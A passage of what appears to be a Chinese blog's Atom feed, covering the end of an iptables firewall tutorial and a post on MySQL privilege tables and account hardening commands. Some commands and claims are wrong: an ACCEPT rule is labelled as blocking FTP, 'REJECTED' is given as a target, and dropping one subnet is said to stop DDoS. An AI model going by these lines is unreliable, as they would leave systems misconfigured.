title="规则表"></a>规则表</h3><p>表的作用：容纳各种规则链<br>表的划分依据：防火墙规则的作用相似</p><p>默认包括4个规则表<br><code>raw</code>表：确定是否对该数据包进行状态跟踪<br><code>mangle</code>表：为数据包设置标记<br><code>nat</code>表：修改数据包中的源、目标IP地址或端口<br><code>filter</code>表：确定是否放行该数据包（过滤）<br>常用的就是其中<strong>filter</strong>表<strong>nat</strong>表多用于实现ip的转化功能，这里的表功能个人感觉相当于链下面的表功能，每种链都存在这四种表</p><h3 id="规则表之间的默认优先级"><a href="#规则表之间的默认优先级" class="headerlink" title="规则表之间的默认优先级"></a>规则表之间的默认优先级</h3><p><code>raw&gt;mangle&gt;nat&gt;filter</code><br>规则链之间的默认优先级<br>入站：<code>PREROUTING&gt;INPUT</code><br>出站：<code>OUTPUT&gt;POSTROUTING</code><br>转发：<code>PREROUTING&gt;FORWARD&gt;POSTROUTING</code><br>规则链内的匹配顺序<br>按顺序依次检查，匹配即停止（LOG策略例外）<br>若找不到相匹配的规则，则按该链的默认策略处理，这跟路由转发还是有点区别的<br><a href="https://imgchr.com/i/PaIBb4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaIBb4.md.png" alt="PaIBb4.md.png"></a></p><p>整个基本流程大概就是这样，反正吧现在的网络环境一般都是只需要其中的一部分</p><h3 id="命令实现"><a href="#命令实现" class="headerlink" title="命令实现"></a>命令实现</h3><p>基本格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables  [-t 表名]  选项  [链名]  [条件]  [-j 控制类型]</span><br></pre></td></tr></table></figure><p>几个<code>注意事项</code><br>不指定表名时，默认指filter表<br>不指定链名时，默认指表内的所有链<br>除非设置链的默认策略，否则必须指定匹配条件<br>选项、链名、控制类型使用大写字母，其余均为小写</p><p>数据包的常见控制类型<br><code>ACCEPT</code>：允许通过<br><code>DROP</code>：直接丢弃，不给出任何回应<br><code>REJECT</code>：拒绝通过，必要时会给出提示<br><code>LOG</code>：记录日志信息，然后传给下一条规则继续匹配</p><p>添加新的规则,这里考虑到他的匹配规则必要的时候需要换一下命令<br><code>-A</code>：在链的末尾追加一条规则<br><code>-I</code>：在链的开头（或指定序号）插入一条规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp -j ACCEPT   直接在最后加入规则</span><br><span class="line">iptables -I INPUT 2 -p icmp -j ACCEPT 这样就是在第二条后面插入规则</span><br></pre></td></tr></table></figure><p>删除、清空规则<br><code>-D</code>：删除链内指定序号（或内容）的一条规则<br><code>-F</code>：清空所有的规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> iptables -F  清空所有规则</span><br><span class="line">iptables -D INPUT 3  删除第三条规则</span><br></pre></td></tr></table></figure><p>设置默认策略<br><code>-P</code>：为指定的链设置默认规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P FORWARD DROP  给FORWARD链默认设置DROP规则</span><br></pre></td></tr></table></figure><p>协议匹配：<code>-p</code> 协议名<br>地址匹配：<code>-s</code> 源地址、<code>-d</code> 目的地址<br>接口匹配：<code>-i</code> 入站网卡、<code>-o</code> 出站网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -p ! icmp -j ACCEPT  这条命令的意思就是除了icmp协议之外的所有协议都ACCEPT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 10.20.30.0/24 -j DROP  这条命令的意思就是把来自10.20.30.0这一个网段的包全都丢掉，有效防止了DDOS攻击</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP </span><br><span class="line">iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line">iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br></pre></td></tr></table></figure><p>上面这三条命令也很有实际意义，假设有人恶意串改了源地址，同时把这个包发送到内网，内网的机子会对这种包做出响应，此时源地址变成目的地址，就会直接在内网里面一个个尝试对应IP从而可以攻击内网的机子，因为这种源IP是内网地址的是不可能出现在互联网上的，理所当然应该禁止</p><p>端口匹配：<code>--sport</code>源端口、<code>--dport</code> 目的端口<br>TCP标记匹配：<code>--tcp-flags</code> 检查范围 被设置的标记<br>ICMP类型匹配：<code>--icmp-type</code> ICMP类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.4.0/24 -p udp --dport 53 -j ACCEPT   对于192.168.4.0这个网段的DNS服务开启做相应规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT 禁止FTP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这就是我前面讲的对应自己ping别人可收到响应报文，别人却ping不到你，有效降低你被别人攻击的可能</p><p>再来看看一个例子<br>输入命令<code>iptables -t filter -I INPUT -p icmp -j REJECTED</code><br>这条命令是对进入的数据包进行icmp所有协议包进行过滤，需要注意两点第一，控制类型不一样返回的效果也不一样，第二对于icmp这种类型的报文而言，响应包跟请求包都被截了，后面会讲到如何可以接受icmp响应包而不接受请求包<br>然后尝试ping一下对面的机子，这是拒绝(REJECT)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIsa9.png" alt="PaIsa9.png"></p><p>这是直接丢弃(DROP)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIy5R.png" alt="PaIy5R.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本来还想写写Windows下的防火墙，但由于是图形化界面，学起来也容易上手，就没写了，我比较懒~~~运用好防火墙，可以隐藏你自己的IP地址，减少被攻击的可能性，在生活中大有用处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Linux下&lt;code&gt;iptables&lt;/code&gt;的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="Linux安全" scheme="0verwatch.top/tags/Linux%E5%AE%89%E5%85%A8/"/>
    
      <category term="服务器运维" scheme="0verwatch.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Mysql安全配置</title>
    <link href="0verwatch.top/2018/07/26/Mysql-security-1/"/>
    <id>0verwatch.top/2018/07/26/Mysql-security-1/</id>
    <published>2018-07-26T12:35:31.000Z</published>
    <updated>2018-07-26T12:37:15.855Z</updated>
    
    <content type="html"><![CDATA[<p>mysql中存在4个控制权限的表，分别为<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql.USER表</span><br><span class="line">2. mysql.DB表</span><br><span class="line">3. mysql.TABLES_PRIV表</span><br><span class="line">4. mysql.COLUMNS_PRIV表</span><br></pre></td></tr></table></figure><p>要注意的是，Mysql中有一个数据库”<code>information_schema</code>“，似乎里面保存的也是一些权限信息，但是要明白的是，这个数据库”<code>information_schema</code>“是为系统管理员提供元数据的一个简便方式，它实际上是一个视图，可以理解为对Mysql中的一个信息的封装，对于Mysql主程序来说，身份认证和授权的信息的来源只有一个，就是”<code>mysql</code>“。</p><p>在我们进行数据库连接、登录的时候，mysql权限表的验证过程为：</p><ol><li>先从user表中的:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Host</span><br><span class="line">2) User</span><br><span class="line">3) Password</span><br></pre></td></tr></table></figure><p>这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p><ol start="2"><li>通过身份认证后，进行权限分配，按照下面的顺序进行验证。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1) user</span><br><span class="line">2) db</span><br><span class="line">3) tables_priv</span><br><span class="line">4) columns_priv</span><br></pre></td></tr></table></figure><p>即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将<code>不再</code>检查<code>db，tables_priv,columns_priv</code><br>如果全局权限表<code>user</code>对应的权限为<code>N</code>，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限<br>如果db中为N，则检查<code>tables_priv</code>中此数据库对应的具体表，取得表中的权限Y，以此类推。逐级下降</p><p>用自己的话讲就是因为查找他们权限是否配置好根据情况查看<code>mysql</code>这个数据库中的<code>user，db，tables_priv，columns_pri</code>，一旦在某个级别设置好了权限就不需要网下一级去看他是否存在权限了，因为下面一级的表都不会显示，这是为了防止数据库数据冗余。就是例如你设置的是所有数据库及表的权限的话，到时候就直接<code>select * from user;</code>就可以查看对应的程序啦<br><a href="https://imgchr.com/i/PNNSfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/26/PNNSfK.md.png" alt="PNNSfK.md.png"></a></p><p>对于Mysql中的账户权限相关的安全配置，总结如下：</p><ol><li>针对每个网站建立一个单独的账户</li><li>为每个网站单独建立一个专属数据库(虽然DEDE、DZ普通采用表前缀的方法来实现”一库多站”，但好的做法还是”一库一站”)</li><li>按照<code>user-&gt;db-&gt;tables_priv-&gt;columns_pri</code>的顺序进行细粒度的权限控制</li><li>为每个用户单独配置一个专属数据库，保证当前用户的所有操作只能发生在它自己的数据库中，防止SQL注入发生后，黑客通过注入点访问到系统表</li></ol><p>账户权限安全配置需要的常用命令<br>1)新建一个用户并给予相应数据库的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete,create,drop privileges on 数据库名字.表名 to user@localhost identified by 'passwd';    //如果是*号就是代表全部*.*代表所有数据库下的全部表名</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.* <span class="keyword">to</span> <span class="keyword">user</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure><p>2) 刷新权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>3)显示授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span>;  //这句话只显示当前登录用户的权限</span><br></pre></td></tr></table></figure><p>4) 移除授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure><p>5) 删除用户<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>6) 给用户改名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> <span class="string">'jack'</span>@<span class="string">'%'</span> <span class="keyword">to</span> <span class="string">'jim'</span>@<span class="string">'%'</span>;``</span><br></pre></td></tr></table></figure></p><p>7) 给用户改密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mysql中存在4个控制权限的表，分别为
    
    </summary>
    
      <category term="Mysql安全配置" scheme="0verwatch.top/categories/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Mysql安全配置" scheme="0verwatch.top/tags/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
</feed>
